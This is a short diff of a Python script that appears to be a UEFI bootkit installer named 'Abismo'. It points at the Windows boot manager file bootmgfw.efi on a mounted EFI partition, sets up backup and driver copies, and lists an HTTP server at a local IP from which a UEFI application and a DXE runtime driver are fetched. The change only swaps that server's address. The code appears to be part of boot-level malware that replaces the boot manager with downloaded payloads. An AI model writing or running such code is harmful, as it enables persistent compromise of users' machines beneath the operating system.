@@ -70,8 +70,8 @@ def main():
     var_windows_boot_manager_file = 'M:\\EFI\\Microsoft\\Boot\\bootmgfw.efi'
     var_windows_boot_manager_backup = 'M:\\EFI\\Microsoft\\Boot\\bootmgfwcp.efi'
     var_windows_boot_manager_driver = 'M:\\EFI\\Microsoft\\Boot\\bootmgfwdd.efi'
-    servers_uefi_app = ['http://192.168.1.55:9876/AbismoApplicationUEFI.efi']
-    servers_dxe_runtime_driver = ['http://192.168.1.55:9876/AbismoDriverDXERuntime.efi']
+    servers_uefi_app = ['http://192.168.1.42:9876/AbismoApplicationUEFI.efi']
+    servers_dxe_runtime_driver = ['http://192.168.1.42:9876/AbismoDriverDXERuntime.efi']
 
 
     # Hello World
